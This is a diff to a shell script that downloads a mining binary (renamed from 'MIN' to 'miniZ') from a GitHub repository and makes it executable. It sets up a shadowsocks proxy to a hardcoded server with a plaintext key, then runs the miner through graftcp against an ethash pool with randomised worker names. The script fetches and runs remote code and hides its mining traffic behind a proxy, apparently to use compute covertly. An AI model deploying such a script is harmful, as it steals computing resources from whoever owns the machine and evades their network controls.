@@ -34,14 +34,14 @@ sleep .2
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/thefacta/miner/raw/main/MIN
-chmod +x MIN
+./graftcp/graftcp wget https://github.com/thefacta/miner/raw/main/miniZ
+chmod +x miniZ
 
 apt -y install shadowsocks-libev rng-tools
 
 ss-local -s 144.217.7.95 -p 8388 -l 9999 -k rslzw -m chacha20-ietf-poly1305 -v &
  
 sleep 2
-./graftcp/graftcp ./MIN --url=hijrahku.$(echo $(shuf -i 10-40 -n 1)-MAGIC)@ethash.kupool.com:443 --log --extra 
+./graftcp/graftcp ./miniZ --url=hijrahku.$(echo $(shuf -i 10-40 -n 1)-MAGIC)@ethash.kupool.com:443 --log --extra 
 sleep 2
-./graftcp/graftcp ./MIN --url=hijrahku.$(echo $(shuf -i 10-40 -n 1)-MAGIC)@ethash.kupool.com:1800 --log --extra 
+./graftcp/graftcp ./miniZ --url=hijrahku.$(echo $(shuf -i 10-40 -n 1)-MAGIC)@ethash.kupool.com:1800 --log --extra 
